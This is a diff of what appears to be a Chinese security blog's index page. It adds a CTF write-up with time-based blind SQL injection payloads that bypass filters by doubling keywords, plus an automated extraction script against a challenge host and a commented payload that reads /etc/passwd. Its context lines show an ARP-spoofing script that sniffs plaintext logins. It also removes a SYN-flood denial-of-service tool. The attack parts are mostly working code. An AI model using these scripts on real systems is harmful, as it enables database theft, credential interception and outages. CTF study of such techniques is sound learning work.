@@ -113,7 +113,7 @@
 				
 				<section class="switch-part switch-part2">
 					<div class="widget tagcloud" id="js-tagcloud">
-						<a href="/tags/SSRF/" style="font-size: 10px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 13.33px;">SSTI</a> <a href="/tags/http/" style="font-size: 11.67px;">http</a> <a href="/tags/java/" style="font-size: 11.67px;">java</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 13.33px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.33px;">sql注入</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 15px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A8%A1%E6%9D%BF/" style="font-size: 10px;">模板</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 16.67px;">脚本编写</a>
+						<a href="/tags/SSRF/" style="font-size: 11.67px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 13.33px;">SSTI</a> <a href="/tags/http/" style="font-size: 11.67px;">http</a> <a href="/tags/java/" style="font-size: 11.67px;">java</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 13.33px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.33px;">sql注入</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 15px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A8%A1%E6%9D%BF/" style="font-size: 10px;">模板</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 16.67px;">脚本编写</a>
 					</div>
 				</section>
 				
@@ -168,6 +168,70 @@
 	</div>
 </nav>
       <div class="body-wrap">
+  
+    <article id="post-双写绕过(时间注入)" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/07/27/%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87(%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5)/" class="article-date">
+  	<time datetime="2021-07-26T16:00:00.000Z" itemprop="datePublished">2021-07-27</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/07/27/%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87(%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5)/">
+        双写绕过(时间注入）
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="双写注入（吃鸡杯web问答题）"><a href="#双写注入（吃鸡杯web问答题）" class="headerlink" title="双写注入（吃鸡杯web问答题）"></a>双写注入（吃鸡杯web问答题）</h1><p>首先注册账号，并登录进行问答填写，发现没有出现flag，之后再回到登陆界面并打开源码，看到表单是post提交的，此时我们输入我们登录的账号以及密码，然后用bp进行抓包<br>可以看到两个我们可以控制的变量，分别为：username和studentid，此时我们用-1’#和-1’or1=1#和-1’||1=1#进行sql注入的测试，当然闭合符号可以多尝试”、”)、’)等，之后<br>‘为闭合符号，此时我们可以尝试union的联合注入，盲注以及堆叠注入，这里用的是时间注入。通过尝试我们知道=被过滤了且一些关键词被过滤了，因此空格用/**/代替，关键词可以使用双写绕过构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;||if(ascii(substr(database(),1,1))&lt;80,sleep(2),1)#-------------------------得到数据库</span><br><span class="line"></span><br><span class="line">-1&#x27;||if(ascii(substr(seselectlect/**/group_coonncat(table_name)/**/from/**/iinnfoorrmatioonn_schema.tables/**/whewherere/**/table_schema/**/lilikeke/**/database()),1,1))&lt;80,sleep(1),1)#------------------得到数据表</span><br><span class="line"></span><br><span class="line">-1&#x27;||if(ascii(substr((seselectlect/**/group_coonncat(column_name)/**/from/**/iinnfoorrmatioonn_schema.columns/**/whewherere/**/table_name/**/lilikeke/**/&#x27;ctf&#x27;),1,1))&lt;80,sleep(1),1)#----------------------得到数据列</span><br><span class="line"></span><br><span class="line">-1&#x27;||if(ascii(substr((seselectlect/**/group_coonncat(value)/**/from/**/ctf),1,1))&lt;80,sleep(0.4),1)#---------------得到数据列中value的数据</span><br></pre></td></tr></table></figure>
+<p>由于一个一个试，效率很低，因此可以用脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from time import *</span><br><span class="line">url=&#x27;http://7de161e0-5158-4941-afc2-31cad344927a.challenge.ctf.show:8080/login.php&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag=&#x27;&#x27;</span><br><span class="line">for i in range(1,10000000):</span><br><span class="line">    min=32</span><br><span class="line">    max=128</span><br><span class="line">    while 1:</span><br><span class="line">        j=min+(max-min)//2</span><br><span class="line">        if min==j:</span><br><span class="line">            flag+=chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">        #payload=&quot;-1&#x27;||if(ascii(substr(database(),&#123;&#125;,1))&lt;&#123;&#125;,sleep(0.5),1)#&quot;.format(i,j)</span><br><span class="line">        #payload=&quot;-1&#x27;||if(ascii(substr((seselectlect/**/group_coonncat(table_name)/**/from/**/iinnfoorrmatioonn_schema.tables/**/whewherere/**/table_schema/**/lilikeke/**/database()),&#123;&#125;,1))&lt;&#123;&#125;,sleep(1),1)#&quot;.format(i,j)</span><br><span class="line">        payload=&quot;-1&#x27;||if(ascii(substr((seselectlect/**/group_coonncat(column_name)/**/from/**/iinnfoorrmatioonn_schema.columns/**/whewherere/**/table_name/**/lilikeke/**/&#x27;ctf&#x27;),&#123;&#125;,1))&lt;&#123;&#125;,sleep(1),1)#&quot;.format(i,j)</span><br><span class="line">        #payload=&quot;-1&#x27;||if(ascii(substr((seselectlect/**/group_coonncat(value)/**/from/**/ctf),&#123;&#125;,1))&lt;&#123;&#125;,sleep(0.4),1)#&quot;.format(i,j)</span><br><span class="line"></span><br><span class="line">    #payload=&quot;&#x27;||ascii(substr((load_file(reverse(&#x27;dwssap/cte/&#x27;))),&#123;&#125;,1))&lt;&#123;&#125;#&quot;.format(i,j)</span><br><span class="line"></span><br><span class="line">        data=&#123;</span><br><span class="line">            &#x27;username&#x27;:payload,</span><br><span class="line">            &#x27;studentid&#x27;:&#x27;1&#x27;,</span><br><span class="line">            &#x27;submit&#x27;:&#x27;提交&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">        try:</span><br><span class="line">            r=requests.post(url=url,data=data,timeout=0.3)</span><br><span class="line">            #print(r.text)</span><br><span class="line">            min = j</span><br><span class="line">        except:</span><br><span class="line">            max = j</span><br><span class="line"></span><br><span class="line">        sleep(0.2)</span><br></pre></td></tr></table></figure>
+
+
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
   
     <article id="post-解压爆破(rar)" class="article article-type-post" itemscope itemprop="blogPost">
   
@@ -921,64 +985,6 @@
       
         <h1 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h1><p>代码：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">import time</span><br><span class="line">import re </span><br><span class="line">import os</span><br><span class="line">from scapy.all import *</span><br><span class="line">from threading import Thread</span><br><span class="line"></span><br><span class="line">#定义变量函数</span><br><span class="line">wifi = &#x27;Intel(R) Dual Band Wireless-AC 7265&#x27;</span><br><span class="line">rtable = os.popen(&#x27;route print&#x27;).read()</span><br><span class="line">#print(rtable)</span><br><span class="line">#注意将列表转为字符串</span><br><span class="line">getway = re.findall(r&#x27;0\.0\.0\.0\s+0\.0\.0\.0\s+(\S+)\s&#x27;,rtable)[0]</span><br><span class="line">#print(getway)</span><br><span class="line"></span><br><span class="line">#局域网扫描</span><br><span class="line">def scan():</span><br><span class="line"></span><br><span class="line">#SR()函数用来来发送数据包和接收响应，他会返回两个列表数据，一个是answer list 另一个是unanswered list</span><br><span class="line">#公式：pack=Ether(src=攻击者MAC地址,dst=目标MAC地址)/ARP(hwsrc=攻击者MAC地址,psrc=要假装谁就是谁的IP地址,hwdst=目标MAC地址,pdst=目标IP地址,op=2)</span><br><span class="line">    ans,unans = srp(Ether(dst=&#x27;ff:ff:ff:ff:ff:ff&#x27;)/ARP(pdst=getway+&#x27;/24&#x27;),timeout=1)</span><br><span class="line">    print(&#x27;一共扫描到%d个主机：&#x27;%len(ans))</span><br><span class="line">    for i in ans:</span><br><span class="line">        print(i)</span><br><span class="line"> </span><br><span class="line">#找用户名和密码</span><br><span class="line">def paw(p):</span><br><span class="line">    try:</span><br><span class="line">        if p.haslayer(Raw):</span><br><span class="line">            ss=p.load.decode()</span><br><span class="line">            result=re.findall(r&#x27;userName=(.+)&amp;passWord=(.+)&#x27;,ss)</span><br><span class="line">            if result:</span><br><span class="line">                print(&#x27;user:&#x27;,result[0][0])</span><br><span class="line">                print(&#x27;pass:&#x27;,result[0][1])</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line">      </span><br><span class="line">#抓包</span><br><span class="line">def capture(tip,tcap):</span><br><span class="line">    #冒充自己为网关</span><br><span class="line">    pkts=sniff(iface=wifi,timeout=tcap,filter=&#x27;tcp port 80 and src host %s&#x27;%tip,prn=paw)</span><br><span class="line">        </span><br><span class="line">#arp欺骗攻击</span><br><span class="line">def arpspoof(tip,tcap):</span><br><span class="line">    t = Thread(target=capture,args=(tip,tcap))</span><br><span class="line">    t.start()</span><br><span class="line">    for i in range(tcap*5):</span><br><span class="line">        sendp(Ether(dst=&#x27;ff:ff:ff:ff:ff:ff&#x27;)/ARP(pdst=target,psrc=getway))</span><br><span class="line">        time.sleep(0.2)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    scan()</span><br><span class="line">    target = input(&#x27;输入要攻击的ip地址：&#x27;).strip()</span><br><span class="line">    tl = int(input(&#x27;输入要准备攻击的时间：&#x27;).strip())</span><br><span class="line">    arpspoof(target,tl)</span><br><span class="line">    print(&#x27;攻击结束！&#x27;)</span><br></pre></td></tr></table></figure>
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" rel="tag">脚本编写</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-SYNgj" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/07/17/SYNgj/" class="article-date">
-  	<time datetime="2021-07-16T16:00:00.000Z" itemprop="datePublished">2021-07-17</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/17/SYNgj/">
-        SYN洪泛攻击
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="SYN洪泛攻击"><a href="#SYN洪泛攻击" class="headerlink" title="SYN洪泛攻击"></a>SYN洪泛攻击</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">from scapy.all import *</span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 生成随机的IP</span><br><span class="line">def randomIP():</span><br><span class="line">    ip = &quot;.&quot;.join(map(str, (random.randint(0, 255) for i in range(4))))</span><br><span class="line">    return ip</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 生成随机端口</span><br><span class="line">def randomPort():</span><br><span class="line">    port = random.randint(1000, 10000)</span><br><span class="line">    return port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># syn-flood</span><br><span class="line">def synFlood(count, dstIP, dstPort):</span><br><span class="line">    total = 0</span><br><span class="line">    print(&quot;Packets are sending ...&quot;)</span><br><span class="line">    for i in range(count):</span><br><span class="line">        # IPlayer</span><br><span class="line">        srcIP = randomIP()</span><br><span class="line">        dstIP = dstIP</span><br><span class="line">        IPlayer = IP(src=srcIP, dst=dstIP)</span><br><span class="line">        # TCPlayer</span><br><span class="line">        srcPort = randomPort()</span><br><span class="line">        TCPlayer = TCP(sport=srcPort, dport=dstPort, flags=&quot;S&quot;)</span><br><span class="line">        # 发送包</span><br><span class="line">        packet = IPlayer / TCPlayer</span><br><span class="line">        send(packet)</span><br><span class="line">        total += 1</span><br><span class="line">    print(&quot;Total packets sent: %i&quot; % total)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 显示的信息</span><br><span class="line">def info():</span><br><span class="line">    print(&quot;#&quot; * 30)</span><br><span class="line">    print(&quot;# Welcome to SYN Flood Tool  #&quot;)</span><br><span class="line">    print(&quot;#&quot; * 30)</span><br><span class="line">    # 输入目标IP和端口</span><br><span class="line">    dstIP = input(&quot;Target IP : &quot;)</span><br><span class="line">    dstPort = int(input(&quot;Target Port : &quot;))</span><br><span class="line">    return dstIP, dstPort</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    dstIP, dstPort = info()</span><br><span class="line">    count = int(input(&quot;Please input the number of packets：&quot;))</span><br><span class="line">    synFlood(count, dstIP, dstPort)</span><br></pre></td></tr></table></figure>
       
     </div>
     
